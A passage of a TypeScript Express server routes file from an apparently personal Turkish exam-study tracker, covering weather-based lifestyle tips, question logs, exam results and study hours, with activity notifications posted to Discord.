              pm2_5: airQualityData.list[0].components.pm2_5,
              pm10: airQualityData.list[0].components.pm10,
              o3: airQualityData.list[0].components.o3,
            },
          }
        : null;

      // Geliştirilmiş yaşam tarzı indeksleri
      const temp = currentData.main.temp;
      const windSpeed = Math.round(currentData.wind.speed * 3.6);
      const humidity = currentData.main.humidity;
      const isRaining =
        currentData.weather[0].id >= 500 && currentData.weather[0].id < 600;
      const isSnowing =
        currentData.weather[0].id >= 600 && currentData.weather[0].id < 700;
      const visibility = currentData.visibility || 10000;
      const uvValue = uvData?.value || 0;
      const airQualityIndex = airQualityData?.list[0]?.main?.aqi || 3;

      const lifeIndices = {
        exercise: {
          level: (() => {
            if (isRaining || isSnowing) return "Kötü";
            if (temp < 5 || temp > 35) return "Kötü";
            if (temp < 10 || temp > 30) return "Orta";
            if (airQualityIndex > 3) return "Orta";
            if (windSpeed > 25) return "Orta";
            return "İyi";
          })(),
          emoji: "🏃",
          description: (() => {
            if (isRaining || isSnowing) return "Hava koşulları uygun değil";
            if (temp > 35) return "Aşırı sıcak, egzersizden kaçının";
            if (temp > 30) return "Çok sıcak, sabah/akşam saatleri tercih edin";
            if (temp < 5) return "Çok soğuk, kapalı alan tercih edin";
            if (temp < 10) return "Soğuk, ısınma egzersizleri yapın";
            if (airQualityIndex > 3) return "Hava kalitesi düşük, dikkat edin";
            if (windSpeed > 25) return "Güçlü rüzgar, dikkatli olun";
            return "Dış egzersiz için mükemmel koşullar";
          })(),
        },
        clothing: {
          level: "Uygun",
          emoji: (() => {
            if (temp > 28) return "👕";
            if (temp > 20) return "👔";
            if (temp > 10) return "🧥";
            if (temp > 0) return "🧥";
            return "🧥";
          })(),
          description: (() => {
            if (isRaining) return "Yağmurluk ve şemsiye gerekli";
            if (isSnowing) return "Kalın mont ve bot gerekli";
            if (temp > 28) return "Hafif ve nefes alabilir kıyafetler";
            if (temp > 20) return "Hafif kıyafetler, ince ceket";
            if (temp > 10) return "Orta kalınlık ceket önerilir";
            if (temp > 0) return "Kalın mont ve eldiven gerekli";
            return "Çok kalın kıyafetler, bere ve eldiven şart";
          })(),
        },
        travel: {
          level: (() => {
            if (visibility < 2000) return "Kötü";
            if (isRaining && windSpeed > 20) return "Kötü";
            if (isSnowing || windSpeed > 30) return "Kötü";
            if (isRaining || windSpeed > 20) return "Orta";
            return "İyi";
          })(),
          emoji: "🚗",
          description: (() => {
            if (visibility < 2000)
              return "Görüş mesafesi çok düşük, ertelenebilirse erteleyin";
            if (isSnowing) return "Kar nedeniyle çok dikkatli sürün";
            if (isRaining && windSpeed > 20)
              return "Yağmur ve rüzgar, çok dikkatli olun";
            if (isRaining) return "Yağışlı hava, hızınızı azaltın";
            if (windSpeed > 30) return "Aşırı rüzgar, seyahati erteleyin";
            if (windSpeed > 20) return "Güçlü rüzgar, dikkatli sürün";
            return "Seyahat için uygun koşullar";
          })(),
        },
        skin: {
          level: (() => {
            if (uvValue > 7) return "Yüksek Risk";
            if (uvValue > 3) return "Orta Risk";
            if (humidity < 30 || humidity > 80) return "Dikkat";
            return "İyi";
          })(),
          emoji: "🧴",
          description: (() => {
            if (uvValue > 7)
              return "Güçlü güneş kremi ve koruyucu kıyafet şart";
            if (uvValue > 3) return "Güneş kremi ve şapka önerilir";
            if (humidity > 80)
              return "Yağlı ciltler için hafif nemlendiriciler";
            if (humidity < 30) return "Kuru hava, yoğun nemlendirici kullanın";
            return "Normal cilt bakımı yeterli";
          })(),
        },
        driving: {
          level: (() => {
            if (visibility < 1000) return "Tehlikeli";
            if (isSnowing || (isRaining && windSpeed > 25)) return "Kötü";
            if (isRaining || windSpeed > 20) return "Dikkatli";
            if (visibility < 5000) return "Dikkatli";
            return "İyi";
          })(),
          emoji: "🚙",
          description: (() => {
            if (visibility < 1000) return "Görüş sıfıra yakın, sürmeyin";
            if (isSnowing) return "Kar nedeniyle çok yavaş ve dikkatli sürün";
            if (isRaining && windSpeed > 25)
              return "Fırtına koşulları, mümkünse beklemeyin";
            if (isRaining) return "Yağmur, fren mesafesini artırın";
            if (windSpeed > 20) return "Rüzgar yan yana araçları etkileyebilir";
            if (visibility < 5000) return "Sisli hava, farları açın";
            return "Sürüş için ideal koşullar";
          })(),
        },
      };

      const responseData = {
        location: location,
        current: {
          temperature: Math.round(currentData.main.temp),
          description: currentData.weather[0].description,
          emoji: getWeatherEmoji(currentData.weather[0].id, isDay),
          humidity: currentData.main.humidity,
          windSpeed: Math.round(currentData.wind.speed * 3.6),
          windDirection: currentData.wind.deg,
          windDescription:
            windSpeed < 5
              ? "sakin"
              : windSpeed < 15
                ? "hafif meltem"
                : "güçlü rüzgar",
          feelsLike: Math.round(currentData.main.feels_like),
          pressure: currentData.main.pressure,
          visibility: Math.round(currentData.visibility / 1000),
          precipitation: currentData.rain
            ? currentData.rain["1h"] || 0
            : currentData.snow
              ? currentData.snow["1h"] || 0
              : 0,
        },
        hourlyForecast,
        sunData: {
          sunrise: sunrise.toLocaleTimeString("tr-TR", {
            hour: "2-digit",
            minute: "2-digit",
          }),
          sunset: sunset.toLocaleTimeString("tr-TR", {
            hour: "2-digit",
            minute: "2-digit",
          }),
          dayLength: `${Math.round((sunset.getTime() - sunrise.getTime()) / 3600000)}s ${Math.round(((sunset.getTime() - sunrise.getTime()) % 3600000) / 60000)}dk`,
          sunProgress: isDay
            ? ((now.getTime() - sunrise.getTime()) /
                (sunset.getTime() - sunrise.getTime())) *
              100
            : 0,
        },
        forecast: dailyForecast,
        uvIndex: getUVIndex(),
        airQuality,
        lifeIndices,
      };

      res.json(responseData);
    } catch (error) {
      console.error("Weather API error:", error);
      res.status(500).json({ message: "Hava durumu verileri alınamadı" });
    }
  });

  // cevap logları routes
  app.get("/api/question-logs", async (req, res) => {
    try {
      const logs = await storage.getQuestionLogs();
      res.json(logs);
    } catch (error) {
      res.status(500).json({ message: "❌ Soru logları yüklenemedi" });
    }
  });

  app.post("/api/question-logs", async (req, res) => {
    try {
      const validatedData = insertQuestionLogSchema.parse(req.body);
      const log = await storage.createQuestionLog(validatedData);
      const correctCount = parseInt(validatedData.correct_count || '0');
      const wrongCount = parseInt(validatedData.wrong_count || '0');
      const blankCount = parseInt(validatedData.blank_count || '0');
      const totalQuestions = correctCount + wrongCount + blankCount;
      const net = correctCount - (wrongCount * 0.25);
      
      // Discord'a detayli bilgi gonder
      try {
        await UserActivityLogger.log({
          userId: 'system',
          userName: 'Afyonlum',
          category: 'question',
          action: 'created',
          entityId: log.id,
          entityType: 'question_log',
          details: `${totalQuestions} soru - ${validatedData.subject} (Net: ${net.toFixed(2)})`,
          payloadSnapshot: JSON.stringify({
            subject: validatedData.subject,
            topic: validatedData.topic || null,
            correct_count: correctCount,
            wrong_count: wrongCount,
            blank_count: blankCount,
            exam_type: validatedData.exam_type || 'branch',
            study_date: validatedData.study_date || null,
            time_spent_minutes: validatedData.time_spent_minutes || null,
            wrong_topics: validatedData.wrong_topics || []
          })
        });
      } catch (logError) {
        // Loglama hatasi uygulamayi durdurmamal
      }
      
      logActivity('Soru Kaydı Eklendi', `${totalQuestions} soru - ${validatedData.subject}`);
      res.status(201).json(log);
    } catch (error) {
      if (error instanceof z.ZodError) {
        res
          .status(400)
          .json({ message: "⚠️ Geçersiz soru logu verisi", errors: error.errors });
      } else {
        res.status(500).json({ message: "❌ Soru logu oluşturulamadı" });
      }
    }
  });

  app.get("/api/question-logs/range", async (req, res) => {
    try {
      const { startDate, endDate } = req.query;
      if (!startDate || !endDate) {
        return res
          .status(400)
          .json({ message: "Start date and end date are required" });
      }
      const logs = await storage.getQuestionLogsByDateRange(
        startDate as string,
        endDate as string,
      );
      res.json(logs);
    } catch (error) {
      res
        .status(500)
        .json({ message: "Failed to fetch question logs by date range" });
    }
  });

  app.delete("/api/question-logs/all", async (req, res) => {
    try {
      // Silmeden önce sayıyı al
      const logs = await storage.getQuestionLogs();
      const count = logs?.length || 0;
      
      await storage.deleteAllQuestionLogs();
      
      // ✅ UserActivityLogger ile Discord bildirimi gönder
      try {
        await UserActivityLogger.log({
          userId: 'system',
          userName: 'Afyonlum',
          category: 'question',
          action: 'deleted',
          entityId: 'all',
          entityType: 'question_log',
          details: 'Tüm soru kayıtları silindi',
          payloadSnapshot: JSON.stringify({
            deleted_count: count,
            deletedAt: new Date().toISOString()
          })
        });
      } catch (logError) {}
      
      logActivity('❌ TÜM SORU KAYITLARI SİLİNDİ', 'Toplu silme işlemi');
      res.json({ message: "All question logs deleted" });
    } catch (error) {
      res.status(500).json({ message: "Failed to delete all question logs" });
    }
  });

  app.delete("/api/question-logs/:id", async (req, res) => {
    try {
      const { id } = req.params;
      
      // Silmeden önce log bilgisini al
      const logs = await storage.getQuestionLogs();
      const logToDelete = logs.find((l: any) => l.id === id);
      
      const deleted = await storage.deleteQuestionLog(id);
      
      if (!deleted) {
        return res.status(404).json({ message: "Question log not found" });
      }
      
      // ✅ UserActivityLogger ile Discord bildirimi gönder
      if (logToDelete) {
        const correct = parseInt(logToDelete.correct_count) || 0;
        const wrong = parseInt(logToDelete.wrong_count) || 0;
        const total = correct + wrong;
        
        try {
          await UserActivityLogger.log({
            userId: 'system',
            userName: 'Afyonlum',
            category: 'question',
            action: 'deleted',
            entityId: id,
            entityType: 'question_log',
            details: logToDelete.subject + ' - ' + total + ' soru silindi',
            payloadSnapshot: JSON.stringify({
              subject: logToDelete.subject,
              correct_count: correct,
              wrong_count: wrong,
              blank_count: parseInt(logToDelete.blank_count) || 0,
              study_date: logToDelete.study_date,
              deletedAt: new Date().toISOString()
            })
          });
        } catch (logError) {}
      }

      logActivity('Soru Kaydı Silindi');
      res.status(204).send();
    } catch (error) {
      res.status(500).json({ message: "Failed to delete question log" });
    }
  });

  app.put("/api/question-logs/:id", async (req, res) => {
    try {
      const { id } = req.params;
      const updates = req.body;
      const updated = await storage.updateQuestionLog(id, updates);
      
      if (!updated) {
        return res.status(404).json({ message: "Question log not found" });
      }

      // ✅ UserActivityLogger ile Discord bildirimi gönder
      const correct = parseInt(updated.correct_count) || 0;
      const wrong = parseInt(updated.wrong_count) || 0;
      const total = correct + wrong;
      const actionType = updates.archived ? 'archived' : 'updated';
      
      try {
        await UserActivityLogger.log({
          userId: 'system',
          userName: 'Afyonlum',
          category: 'question',
          action: actionType,
          entityId: id,
          entityType: 'question_log',
          details: updated.subject + ' - ' + total + ' soru ' + (updates.archived ? 'arşivlendi' : 'güncellendi'),
          payloadSnapshot: JSON.stringify({
            subject: updated.subject,
            correct_count: correct,
            wrong_count: wrong,
            blank_count: parseInt(updated.blank_count) || 0,
            study_date: updated.study_date,
            archived: updates.archived || false
          })
        });
      } catch (logError) {}

      if (updates.archived) {
        logActivity('Soru Kaydı Arşivlendi');
      } else {
        logActivity('Soru Kaydı Güncellendi');
      }

      res.json(updated);
    } catch (error) {
      res.status(500).json({ message: "Failed to update question log" });
    }
  });

  app.get("/api/question-logs/archived", async (req, res) => {
    try {
      const logs = await storage.getArchivedQuestionLogs();
      res.json(logs);
    } catch (error) {
      res.status(500).json({ message: "Failed to fetch archived question logs" });
    }
  });

  // Konu istatistikleri routes
  app.get("/api/topics/stats", async (req, res) => {
    try {
      const stats = await storage.getTopicStats();
      res.json(stats);
    } catch (error) {
      res.status(500).json({ message: "Failed to fetch topic statistics" });
    }
  });

  app.get("/api/topics/priority", async (req, res) => {
    try {
      const priorityTopics = await storage.getPriorityTopics();
      res.json(priorityTopics);
    } catch (error) {
      res.status(500).json({ message: "Failed to fetch priority topics" });
    }
  });

  app.get("/api/subjects/stats", async (req, res) => {
    try {
      const stats = await storage.getSubjectSolvedStats();
      res.json(stats);
    } catch (error) {
      res.status(500).json({ message: "Failed to fetch subject statistics" });
    }
  });

  // Sınav sonuçları routes
  app.get("/api/exam-results", async (req, res) => {
    try {
      const results = await storage.getExamResults();
      res.json(results);
    } catch (error) {
      res.status(500).json({ message: "Failed to fetch exam results" });
    }
  });

  app.post("/api/exam-results", async (req, res) => {
    try {
      const validatedData = insertExamResultSchema.parse(req.body);
      const result = await storage.createExamResult(validatedData);
      
      // Discord'a detayli deneme bilgisi gonder
      try {
        const tytNet = parseFloat(validatedData.tyt_net || '0');
        const aytNet = parseFloat(validatedData.ayt_net || '0');
        
        // subjects_data'dan toplam dogru/yanlis/bos hesapla
        let totalCorrect = 0;
        let totalWrong = 0;
        let totalBlank = 0;
        if (validatedData.subjects_data) {
          try {
            const subjectsData = JSON.parse(validatedData.subjects_data);
            for (const subjectData of Object.values(subjectsData)) {
              const data = subjectData as any;
              totalCorrect += parseInt(data.correct) || 0;
              totalWrong += parseInt(data.wrong) || 0;
              totalBlank += parseInt(data.blank) || 0;
            }
          } catch {}
        }
        
        await UserActivityLogger.log({
          userId: 'system',
          userName: 'Afyonlum',
          category: 'exam',
          action: 'created',
          entityId: result.id,
          entityType: 'exam_result',
          details: `${validatedData.display_name || validatedData.exam_name} - TYT: ${tytNet.toFixed(2)}, AYT: ${aytNet.toFixed(2)}`,
          payloadSnapshot: JSON.stringify({
            exam_name: validatedData.exam_name,
            display_name: validatedData.display_name || null,
            exam_type: validatedData.exam_type,
            exam_scope: validatedData.exam_scope,
            exam_date: validatedData.exam_date,
            tyt_net: tytNet,
            ayt_net: aytNet,
            total_correct: totalCorrect,
            total_wrong: totalWrong,
            total_blank: totalBlank,
            time_spent_minutes: validatedData.time_spent_minutes || null,
            solve_time: validatedData.time_spent_minutes || null,
            subjects_data: validatedData.subjects_data || null
          })
        });
      } catch (logError) {
        // Loglama hatasi uygulamayi durdurmamal
      }
      
      logActivity('Deneme Sınav Eklendi', validatedData.display_name || validatedData.exam_name);

      // Eğer subjects_data sağlanmışsa, sınav konu netleri oluştur
      if (validatedData.subjects_data) {
        try {
          const subjectsData = JSON.parse(validatedData.subjects_data);

          // Her konu için veri ile konu netleri oluştur
          for (const [subjectName, subjectData] of Object.entries(
            subjectsData,
          )) {
            const data = subjectData as any;
            if (data.correct || data.wrong || data.blank) {
              const correct = parseInt(data.correct) || 0;
              const wrong = parseInt(data.wrong) || 0;
              const blank = parseInt(data.blank) || 0;
              const netScore = correct - wrong * 0.25;

              // ders isimlerini Türkçe'ye çevir
              const subjectNameMap: { [key: string]: string } = {
                turkce: "Türkçe",
                matematik: "Matematik",
                sosyal: "Sosyal Bilimler",
                fen: "Fen Bilimleri",
                fizik: "Fizik",
                kimya: "Kimya",
                biyoloji: "Biyoloji",
                geometri: "Geometri",
              };

              // Branş denemesi için exam_type'ı direkt kullan
              // Tam deneme için ders bazında TYT/AYT belirle
              let examType: "TYT" | "AYT";
              if (validatedData.exam_scope === "branch") {
                // Branş denemesinde kullanıcının seçtiği exam_type'ı kullan
                // TYT branş denemesinde Fizik/Kimya/Biyoloji de TYT olarak kaydedilmeli
                examType = (validatedData.exam_type as "TYT" | "AYT") || "TYT";
              } else {
                // Tam denemede validatedData.exam_type'a göre belirle
                if (validatedData.exam_type === "TYT") {
                  // TYT denemesi - TYT dersleri (Fen Bilimleri genel bir ders olarak)
                  // Genel TYT denemesinde Fizik/Kimya/Biyoloji ayrı girilmez, sadece Fen Bilimleri vardır
                  const isTYTSubject = [
                    "turkce",
                    "matematik",
                    "sosyal",
                    "fen",
                    "geometri"
                  ].includes(subjectName);
                  examType = isTYTSubject ? "TYT" : "AYT";
                } else {
                  // AYT denemesi - yalnızca AYT dersleri
                  const isAYTSubject = [
                    "matematik",
                    "fizik",
                    "kimya",
                    "biyoloji",
                    "geometri"
                  ].includes(subjectName);
                  examType = isAYTSubject ? "AYT" : "TYT";
                }
              }
              
              const mappedSubjectName =
                subjectNameMap[subjectName] || subjectName;

              // wrong_topics'i JSON formatına çevir
              const wrongTopicsJson = data.wrong_topics && data.wrong_topics.length > 0 
                ? JSON.stringify(data.wrong_topics.map((topic: string) => ({ topic })))
                : null;

              await storage.createExamSubjectNet({
                exam_id: result.id,
                exam_type: examType,
                subject: mappedSubjectName,
                net_score: netScore.toString(),
                correct_count: correct.toString(),
                wrong_count: wrong.toString(),
                blank_count: blank.toString(),
                wrong_topics_json: wrongTopicsJson,
              });
            }
          }
        } catch (parseError) {
          console.error("Failed to parse subjects_data:", parseError);
        }
      }

      res.status(201).json(result);
    } catch (error) {
      if (error instanceof z.ZodError) {
        res
          .status(400)
          .json({ message: "Invalid exam result data", errors: error.errors });
      } else {
        res.status(500).json({ message: "Failed to create exam result" });
      }
    }
  });

  app.put("/api/exam-results/:id", async (req, res) => {
    try {
      const { id } = req.params;
      const updates = req.body;
      
      const updatedResult = await storage.updateExamResult(id, updates);
      
      if (!updatedResult) {
        return res.status(404).json({ message: "Exam result not found" });
      }
      
      // ✅ UserActivityLogger ile Discord bildirimi gönder
      const tytNet = parseFloat(updatedResult.tyt_net || '0');
      const aytNet = parseFloat(updatedResult.ayt_net || '0');
      const actionType = updates.archived ? 'archived' : 'updated';
      
      try {
        await UserActivityLogger.log({
          userId: 'system',
          userName: 'Afyonlum',
          category: 'exam',
          action: actionType,
          entityId: id,
          entityType: 'exam_result',
          details: (updatedResult.display_name || updatedResult.exam_name) + ' ' + (updates.archived ? 'arşivlendi' : 'güncellendi'),
          payloadSnapshot: JSON.stringify({
            exam_name: updatedResult.exam_name,
            display_name: updatedResult.display_name,
            exam_type: updatedResult.exam_type,
            exam_date: updatedResult.exam_date,
            tyt_net: tytNet,
            ayt_net: aytNet,
            archived: updates.archived || false
          })
        });
      } catch (logError) {}
      
      if (updates.archived) {
        logActivity('Deneme Arşivlendi', updatedResult.display_name || updatedResult.exam_name);
      } else {
        logActivity('Deneme Güncellendi', updatedResult.display_name || updatedResult.exam_name);
      }
      
      res.json(updatedResult);
    } catch (error) {
      if (error instanceof z.ZodError) {
        res.status(400).json({ message: "Invalid exam result data", errors: error.errors });
      } else {
        res.status(500).json({ message: "Failed to update exam result" });
      }
    }
  });

  app.delete("/api/exam-results/all", async (req, res) => {
    try {
      // Silmeden önce sayıyı al
      const results = await storage.getExamResults();
      const count = results?.length || 0;
      
      await storage.deleteAllExamResults();
      
      // ✅ UserActivityLogger ile Discord bildirimi gönder
      try {
        await UserActivityLogger.log({
          userId: 'system',
          userName: 'Afyonlum',
          category: 'exam',
          action: 'deleted',
          entityId: 'all',
          entityType: 'exam_result',
          details: 'Tüm denemeler silindi',
          payloadSnapshot: JSON.stringify({
            deleted_count: count,
            deletedAt: new Date().toISOString()
          })
        });
      } catch (logError) {}
      
      logActivity('❌ TÜM DENEMELER SİLİNDİ', 'Toplu silme işlemi');
      res.json({ message: "All exam results deleted" });
    } catch (error) {
      res.status(500).json({ message: "Failed to delete all exam results" });
    }
  });

  app.delete("/api/exam-results/:id", async (req, res) => {
    try {
      const { id } = req.params;
      
      // Silmeden önce deneme bilgisini al
      const results = await storage.getExamResults();
      const examToDelete = results.find((e: any) => e.id === id);
      
      const deleted = await storage.deleteExamResult(id);
      
      if (!deleted) {
        return res.status(404).json({ message: "Exam result not found" });
      }
      
      // ✅ UserActivityLogger ile Discord bildirimi gönder
      if (examToDelete) {
        try {
          await UserActivityLogger.log({
            userId: 'system',
            userName: 'Afyonlum',
            category: 'exam',
            action: 'deleted',
            entityId: id,
            entityType: 'exam_result',
            details: (examToDelete.display_name || examToDelete.exam_name) + ' silindi',
            payloadSnapshot: JSON.stringify({
              exam_name: examToDelete.exam_name,
              display_name: examToDelete.display_name,
              exam_type: examToDelete.exam_type,
              exam_date: examToDelete.exam_date,
              tyt_net: parseFloat(examToDelete.tyt_net || '0'),
              ayt_net: parseFloat(examToDelete.ayt_net || '0'),
              deletedAt: new Date().toISOString()
            })
          });
        } catch (logError) {}
      }

      logActivity('Deneme Sınav Silindi');
      res.status(204).send();
    } catch (error) {
      res.status(500).json({ message: "❌ Deneme sonucu silinemedi" });
    }
  });

  app.get("/api/exam-results/archived", async (req, res) => {
    try {
      const results = await storage.getArchivedExamResults();
      res.json(results);
    } catch (error) {
      res.status(500).json({ message: "❌ Arşivlenmiş deneme sonuçları yüklenemedi" });
    }
  });

  // örnek ders netleri routes
  app.get("/api/exam-subject-nets", async (req, res) => {
    try {
      const nets = await storage.getExamSubjectNets();
      res.json(nets);
    } catch (error) {
      res.status(500).json({ message: "❌ Ders net bilgileri yüklenemedi" });
    }
  });

  app.get("/api/exam-subject-nets/exam/:examId", async (req, res) => {
    try {
      const { examId } = req.params;
      const nets = await storage.getExamSubjectNetsByExamId(examId);
      res.json(nets);
    } catch (error) {
      res
        .status(500)
        .json({ message: "❌ Deneme için ders netleri yüklenemedi" });
    }
  });

  app.post("/api/exam-subject-nets", async (req, res) => {
    try {
      const validatedData = insertExamSubjectNetSchema.parse(req.body);
      const net = await storage.createExamSubjectNet(validatedData);
      res.status(201).json(net);
    } catch (error) {
      if (error instanceof z.ZodError) {
        res.status(400).json({
          message: "Invalid exam subject net data",
          errors: error.errors,
        });
      } else if (
        error instanceof Error &&
        error.message.includes("does not exist")
      ) {
        res.status(400).json({ message: error.message });
      } else {
        res.status(500).json({ message: "❌ Ders net bilgisi oluşturulamadı" });
      }
    }
  });

  app.put("/api/exam-subject-nets/:id", async (req, res) => {
    try {
      const { id } = req.params;
      const validatedData = insertExamSubjectNetSchema
        .partial()
        .parse(req.body);
      const net = await storage.updateExamSubjectNet(id, validatedData);

      if (!net) {
        return res.status(404).json({ message: "❌ Ders net bilgisi bulunamadı" });
      }

      res.json(net);
    } catch (error) {
      if (error instanceof z.ZodError) {
        res.status(400).json({
          message: "Invalid exam subject net data",
          errors: error.errors,
        });
      } else {
        res.status(500).json({ message: "❌ Ders net bilgisi güncellenemedi" });
      }
    }
  });

  app.delete("/api/exam-subject-nets/:id", async (req, res) => {
    try {
      const { id } = req.params;
      const deleted = await storage.deleteExamSubjectNet(id);

      if (!deleted) {
        return res.status(404).json({ message: "❌ Ders net bilgisi bulunamadı" });
      }

      res.status(204).send();
    } catch (error) {
      res.status(500).json({ message: "❌ Ders net bilgisi silinemedi" });
    }
  });

  app.delete("/api/exam-subject-nets/exam/:examId", async (req, res) => {
    try {
      const { examId } = req.params;
      const deleted = await storage.deleteExamSubjectNetsByExamId(examId);

      if (!deleted) {
        return res
          .status(404)
          .json({ message: "No exam subject nets found for this exam" });
      }

      res.status(204).send();
    } catch (error) {
      res.status(500).json({ message: "❌ Ders net bilgileri silinemedi" });
    }
  });
  //BURAYI SİLMEYİ UNUTMA !
  //FLASHCARDLARLA İLGİLİ KODLAR YORUMA ALINDI, CANIM İSTERSE YAPCAM
  // Flashcard routes - commented out until implementation is complete
  /*
  app.get("/api/flashcards", async (req, res) => {
    try {
      const flashcards = await storage.getFlashcards();
      res.json(flashcards);
    } catch (error) {
      res.status(500).json({ message: "❌ Flashcard'lar yüklenemedi" });
    }
  });

  app.get("/api/flashcards/due", async (req, res) => {
    try {
      const flashcards = await storage.getFlashcardsDue();
      res.json(flashcards);
    } catch (error) {
      res.status(500).json({ message: "❌ Vadesi gelen flashcard'lar yüklenemedi" });
    }
  });

  app.post("/api/flashcards", async (req, res) => {
    try {
      const validatedData = insertFlashcardSchema.parse(req.body);
      const flashcard = await storage.createFlashcard(validatedData);
      res.status(201).json(flashcard);
    } catch (error) {
      if (error instanceof z.ZodError) {
        res
          .status(400)
          .json({ message: "Invalid flashcard data", errors: error.errors });
      } else {
        res.status(500).json({ message: "❌ Flashcard oluşturulamadı" });
      }
    }
  });

  app.put("/api/flashcards/:id", async (req, res) => {
    try {
      const { id } = req.params;
      const validatedData = insertFlashcardSchema.partial().parse(req.body);
      const flashcard = await storage.updateFlashcard(id, validatedData);

      if (!flashcard) {
        return res.status(404).json({ message: "❌ Flashcard bulunamadı" });
      }

      res.json(flashcard);
    } catch (error) {
      if (error instanceof z.ZodError) {
        res
          .status(400)
          .json({ message: "Invalid flashcard data", errors: error.errors });
      } else {
        res.status(500).json({ message: "❌ Flashcard güncellenemedi" });
      }
    }
  });

  app.post("/api/flashcards/:id/review", async (req, res) => {
    try {
      const { id } = req.params;
      const { difficulty, isCorrect, userAnswer } = req.body;

      if (!["easy", "medium", "hard"].includes(difficulty)) {
        return res.status(400).json({ message: "Invalid difficulty level" });
      }

      const flashcard = await storage.reviewFlashcard(id, difficulty);

      if (!flashcard) {
        return res.status(404).json({ message: "❌ Flashcard bulunamadı" });
      }

      // Eğer cevap yanlışsa hata takibine ekle
      if (!isCorrect && userAnswer && flashcard) {
        await storage.addFlashcardError({
          cardId: id,
          question: flashcard.question,
          topic: flashcard.topic || flashcard.subject,
          difficulty: flashcard.difficulty,
          userAnswer,
          correctAnswer: flashcard.answer,
          timestamp: new Date(),
        });
      }

      res.json(flashcard);
    } catch (error) {
      res.status(500).json({ message: "Failed to review flashcard" });
    }
  });

  // Hata sıklığı analizi için route
  app.get("/api/flashcards/errors", async (req, res) => {
    try {
      const errors = await storage.getFlashcardErrors();
      res.json(errors);
    } catch (error) {
      res.status(500).json({ message: "❌ Flashcard hataları yüklenemedi" });
    }
  });

  app.get("/api/flashcards/errors/by-difficulty", async (req, res) => {
    try {
      const errorsByDifficulty = await storage.getFlashcardErrorsByDifficulty();
      res.json(errorsByDifficulty);
    } catch (error) {
      res
        .status(500)
        .json({ message: "❌ Zorluk seviyesine göre flashcard hataları yüklenemedi" });
    }
  });

  // Örnek kartları yükle
  app.post("/api/flashcards/seed", async (req, res) => {
    try {
      await storage.seedSampleFlashcards();
      res.json({ message: "Sample flashcards seeded successfully" });
    } catch (error) {
      res.status(500).json({ message: "Failed to seed sample flashcards" });
    }
  });

  app.delete("/api/flashcards/:id", async (req, res) => {
    try {
      const { id } = req.params;
      const deleted = await storage.deleteFlashcard(id);

      if (!deleted) {
        return res.status(404).json({ message: "❌ Flashcard bulunamadı" });
      }

      res.status(204).send();
    } catch (error) {
      res.status(500).json({ message: "❌ Flashcard silinemedi" });
    }
  });

  // Export API routes
  app.get("/api/export/json", async (req, res) => {
    try {
      const tasks = await storage.getTasks();
      const moods = await storage.getMoods();
      const dailySummary = await storage.getDailySummary(365); // Full year

      const exportData = {
        exportDate: new Date().toISOString(),
        version: "1.0",
        data: {
          tasks,
          moods,
          summary: dailySummary,
        },
      };

      res.setHeader("Content-Type", "application/json");
      res.setHeader(
        "Content-Disposition",
        `attachment; filename="yapilacaklar-yedegi-${new Date().toISOString().split("T")[0]}.json"`,
      );
      res.json(exportData);
    } catch (error) {
      console.error("JSON export error:", error);
      res.status(500).json({ message: "Export failed" });
    }
  });

  app.get("/api/export/csv", async (req, res) => {
    try {
      const tasks = await storage.getTasks();

      // CSV Header
      let csvContent =
        "ID,Başlık,Açıklama,Öncelik,Kategori,Renk,Tamamlandı,Tamamlanma Tarihi,Bitiş Tarihi,Oluşturulma Tarihi\n";

      // CSV Data
      tasks.forEach((task) => {
        const row = [
          task.id,
          `"${(task.title || "").replace(/"/g, '""')}"`, // Escape quotes
          `"${(task.description || "").replace(/"/g, '""')}"`,
          task.priority,
          task.category,
          task.color || "",
          task.completed ? "Evet" : "Hayır",
          task.completedAt || "",
          task.dueDate || "",
          task.createdAt
            ? new Date(task.createdAt).toLocaleDateString("tr-TR")
            : "",
        ].join(",");
        csvContent += row + "\n";
      });

      res.setHeader("Content-Type", "text/csv; charset=utf-8");
      res.setHeader(
        "Content-Disposition",
        `attachment; filename="gorevler-${new Date().toISOString().split("T")[0]}.csv"`,
      );
      res.send("\uFEFF" + csvContent); // Add BOM for proper UTF-8 encoding
    } catch (error) {
      console.error("CSV export error:", error);
      res.status(500).json({ message: "Export failed" });
    }
  });
  */

  // Çalışma saati routes
  app.get("/api/study-hours", async (req, res) => {
    try {
      const studyHours = await storage.getStudyHours();
      res.json(studyHours);
    } catch (error) {
      res.status(500).json({ message: "Çalışma saatleri getirilirken hata oluştu" });
    }
  });

  app.post("/api/study-hours", async (req, res) => {
    try {
      const validatedData = insertStudyHoursSchema.parse(req.body);
      
      // Aynı tarih için zaten kayıt var mı kontrol et
      const existingStudyHours = await storage.getStudyHours();
      const duplicate = existingStudyHours.find((sh: any) => sh.study_date === validatedData.study_date);
      
      if (duplicate) {
        return res.status(409).json({ message: "Bu tarih için zaten çalışma saati kaydı var!" });
      }
      
      const studyHours = await storage.createStudyHours(validatedData);
      
      // ✅ UserActivityLogger ile detaylı Discord bildirimi gönder
      const hours = validatedData.hours || 0;
      const minutes = validatedData.minutes || 0;
      const seconds = validatedData.seconds || 0;
      const timeStr = hours > 0 ? `${hours} saat ${minutes} dakika` : `${minutes} dakika ${seconds} saniye`;
      
      try {
        await UserActivityLogger.log({
          userId: 'system',
          userName: 'Afyonlum',
          category: 'study',
          action: 'created',
          entityId: studyHours.id,
          entityType: 'study_hour',
          details: timeStr,
          payloadSnapshot: JSON.stringify({
            hours: hours,
            minutes: minutes,
            seconds: seconds,
            study_date: validatedData.study_date,
            total_seconds: (hours * 3600) + (minutes * 60) + seconds
          })
        });
      } catch (logError) {
        // Loglama hatası uygulamayı durdurmamalı
      }
      
      logActivity('Çalışma Saati Eklendi', timeStr);
      res.status(201).json(studyHours);
    } catch (error) {
      if (error instanceof z.ZodError) {
        res.status(400).json({ message: "Geçersiz çalışma saati verisi", errors: error.errors });
      } else {
        res.status(500).json({ message: "Çalışma saati oluşturulurken hata oluştu" });
      }
    }
  });

  app.patch("/api/study-hours/:id", async (req, res) => {
    try {
      const { id } = req.params;
      const validatedData = insertStudyHoursSchema.partial().parse(req.body);
      const studyHours = await storage.updateStudyHours(id, validatedData);
      
      if (!studyHours) {
        return res.status(404).json({ message: "Çalışma saati kaydı bulunamadı" });
      }
      
      // ✅ UserActivityLogger ile Discord bildirimi gönder
      const hours = studyHours.hours || 0;
      const minutes = studyHours.minutes || 0;
      const seconds = studyHours.seconds || 0;
      const timeStr = hours > 0 ? hours + ' saat ' + minutes + ' dakika' : minutes + ' dakika ' + seconds + ' saniye';
      
      try {
